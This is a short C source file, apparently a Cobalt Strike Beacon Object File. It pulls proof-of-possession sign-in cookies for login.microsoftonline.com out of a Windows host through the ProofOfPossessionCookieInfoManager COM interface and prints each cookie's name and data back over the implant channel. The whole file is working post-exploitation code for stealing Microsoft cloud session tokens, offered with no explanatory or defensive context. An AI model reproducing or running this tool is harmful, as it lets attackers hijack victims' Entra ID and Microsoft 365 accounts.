#include <windows.h>
#include "beacon.h"
#include <proofofpossessioncookieinfo.h>

int go(char* args, int argc) {
    LPCWSTR uri = L"https://login.microsoftonline.com/";
    DWORD cookieCount = 0;
    ProofOfPossessionCookieInfo* cookies;
    IProofOfPossessionCookieInfoManager* popCookieManager;
    GUID CLSID_ProofOfPossessionCookieInfoManager;
    GUID IID_IProofOfPossessionCookieInfoManager;

    CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
    IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CoInitialize error: %#lx\n", hr);
        return 0;
    }

    hr = CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, NULL, CLSCTX_INPROC_SERVER, &IID_IProofOfPossessionCookieInfoManager, (void**)(&popCookieManager));
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CoCreateInstance error: %#lx\n", hr);
        CoUninitialize();
        return 0;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[i] Using uri: %ls\n", uri);
    hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] GetCookieInfoForUri error: %#lx\n", hr);
        CoUninitialize();
        return 0;
    }

    if (cookieCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No cookies for the URI\n");
    } else {
        for (DWORD i = 0; i < cookieCount; i++) {
            BeaconPrintf(CALLBACK_OUTPUT, "[>] Name: %s\n", cookies[i].name);
            BeaconPrintf(CALLBACK_OUTPUT, "[>] Data: %s\n", cookies[i].data);
            BeaconPrintf(CALLBACK_OUTPUT, "[>] Flags: %x\n", cookies[i].flags);
            BeaconPrintf(CALLBACK_OUTPUT, "[>] P3PHeader: %s\n\n", cookies[i].p3pHeader);
        }
    }

    CoUninitialize();

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done\n");
    return 0;
}
